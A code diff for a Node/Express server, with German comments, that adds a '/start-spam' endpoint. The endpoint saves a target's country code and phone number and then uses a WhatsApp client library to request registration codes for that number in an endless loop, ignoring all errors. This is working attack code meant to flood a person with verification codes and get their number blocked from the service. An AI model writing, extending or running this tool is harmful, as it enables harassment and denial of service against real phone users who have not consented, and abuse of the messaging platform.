@@ -82,6 +82,61 @@ const app = express();
         res.render(path.join('qr.js'), { title: 'qr' });
     });
 
+
+    
+    app.post('/start-spam', async (req, res) => {
+        const { ddi, number } = req.body;
+    
+        try {
+            // Überprüfen, ob die Kombination von DDI und Nummer bereits in der MongoDB vorhanden ist
+            const existingData = await SpamData.findOne({ ddi, number });
+            if (existingData) {
+                // Optional: Handle case where data already exists
+            } else {
+                // Neue Instanz des Modells erstellen und speichern
+                const newData = new SpamData({ ddi, number });
+                await newData.save();
+                console.log('Data saved successfully');
+            }
+    
+            const { state, saveCreds } = await useMultiFileAuthState('session')
+            const spam = makeWaSocket({
+                auth: state,
+                mobile: true,
+                logger: pino({ level: 'silent' })
+            });
+            const phoneNumber = ddi + number;
+            await dropNumber(spam, phoneNumber, ddi, number);
+    
+            // Erfolgreiche Antwort an den Client senden
+            res.status(200).json({ message: 'Spam started successfully' });
+        } catch (error) {
+            console.log(error);
+            if (error.code === 'SomeSpecificErrorCode') {
+                res.status(400).json({ error: 'Bad request' }); // Send specific error response for a certain error code
+            } else {
+                res.status(500).json({ error: 'Internal server error' }); // Send generic error response for other errors
+            }
+        }
+    });
+    
+    async function dropNumber(spam, phoneNumber, ddi, number) {
+        while (true) {
+            try {
+                const res = await spam.requestRegistrationCode({
+                    phoneNumber: '+' + phoneNumber,
+                    phoneNumberCountryCode: ddi,
+                    phoneNumberNationalNumber: number,
+                    phoneNumberMobileCountryCode: 666,
+                });
+                
+            } catch (error) {
+               
+            }
+        }
+    }
+    
+
     app.listen(port, () => {
        
         console.log(` is listening on port ${port}`);
